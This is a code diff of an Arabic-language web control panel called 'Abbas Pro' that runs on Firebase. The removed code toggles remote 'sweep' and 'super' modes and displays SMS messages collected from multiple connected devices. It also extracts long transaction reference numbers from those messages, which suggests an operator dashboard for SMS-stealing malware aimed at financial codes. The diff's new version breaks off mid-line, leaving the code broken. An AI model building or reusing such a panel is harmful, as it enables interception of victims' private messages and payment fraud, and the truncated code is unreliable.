@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Abbas Pro - Database Synced</title>
+    <title>Abbas Pro - Final Fix</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
@@ -26,7 +26,7 @@
 <div class="card">
     <div class="header">
         <h2 style="margin:0;">نظام عباس الدولي v2.0</h2>
-        <p style="font-size:11px; opacity:0.8;">تم تحديث الحماية ومزامنة المسارات</p>
+        <p style="font-size:11px; opacity:0.8;">تحديث مزامنة الأجهزة النشطة</p>
     </div>
 
     <div class="content">
@@ -35,14 +35,14 @@
         <button id="mainBtn" class="btn" onclick="toggleStatus()">تحميل...</button>
         <button id="turboBtn" class="btn btn-turbo" onclick="toggleTurbo()">الوضع الخارق: تحميل...</button>
 
-        <div class="section" style="border-right-color: #d35400;">
+        <div class="section">
             <strong style="color:#d35400">آخر رقم مرجعي (Ref ID):</strong>
             <div id="extractedTrans" style="font-size:13px; margin-top:5px;">في انتظار أول عملية...</div>
         </div>
 
         <div class="section">
-            <strong style="color:var(--main)">سجل الأنشطة الحية:</strong>
-            <div id="logs" style="font-size:13px; margin-top:5px;"></div>
+            <strong style="color:var(--main)">سجل الأنشطة (الأجهزة المتصلة):</strong>
+            <div id="logs" style="font-size:13px; margin-top:5px; max-height: 200px; overflow-y: auto;">جاري جلب الأجهزة...</div>
         </div>
     </div>
 
@@ -66,50 +66,12 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let status = false, turbo = false;
 
+    // إدارة الأزرار
+    let status = false, turbo = false;
     db.ref('control/status').on('value', snap => {
         status = snap.val() === "true" || snap.val() === true;
-        document.getElementById('stat').innerText = "النظام: " + (status ? "نشط" : "متوقف");
-        const b = document.getElementById('mainBtn');
-        b.innerText = status ? "إيقاف الكسح" : "تفعيل الكسح";
-        b.className = "btn " + (status ? "btn-off" : "btn-on");
-    });
-
-    db.ref('control/turbo').on('value', snap => {
-        turbo = snap.val() === "true" || snap.val() === true;
-        document.getElementById('turboBtn').innerText = "الوضع الخارق: " + (turbo ? "مـفـعـل ✅" : "مـعـطل ❌");
-    });
-
-    function toggleStatus() { db.ref('control/status').set(status ? "false" : "true"); }
-    function toggleTurbo() { db.ref('control/turbo').set(turbo ? "false" : "true"); }
-
-    db.ref('Activate').on('value', snap => {
-        const d = document.getElementById('logs'); 
-        d.innerHTML = "";
-        let foundTrans = false;
-
-        snap.forEach(deviceSnap => {
-            const data = deviceSnap.val();
-            const deviceId = deviceSnap.key;
-            
-            if(data.SMS && data.SMS !== "") {
-                d.innerHTML += `<div style="margin-bottom:8px; border-bottom:1px solid #eee; padding-bottom:5px;">
-                    <span style="color:var(--main); font-weight:bold; font-size:11px;">جهاز (${deviceId.substring(0,6)}):</span><br>
-                    ${data.SMS}
-                </div>`;
-
-                const match = data.SMS.match(/\d{10,}/); 
-                if (match) {
-                    document.getElementById('extractedTrans').innerHTML = `<div>🔢 ID: <span class="trans-id">${match[0]}</span></div>`;
-                    foundTrans = true;
-                }
-            }
-        });
-
-        if(!foundTrans) {
-            document.getElementById('extractedTrans').innerText = "في انتظار أول عملية...";
-        }
+        document.getElementById('stat').innerText = "
     });
 </script>
 </body>
